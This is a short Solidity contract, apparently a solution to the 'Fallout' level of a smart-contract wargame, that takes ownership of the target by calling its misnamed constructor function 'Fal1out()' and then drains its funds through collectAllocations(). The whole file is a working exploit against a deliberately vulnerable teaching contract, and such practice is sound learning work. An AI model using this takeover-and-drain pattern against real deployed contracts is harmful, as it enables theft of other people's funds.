// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.13;

import "@levels/Fallout.sol";

contract Attacker {
    Fallout public target;

    constructor(address _target) payable {
        target = Fallout(_target);
    }

    receive() external payable {}

    function exploit() public payable {
        (bool success, bytes memory return_data) = address(target).call(
            abi.encodeWithSignature("Fal1out()", "")
        );
        require(success, "exploit failed!");
        target.collectAllocations();
    }
}
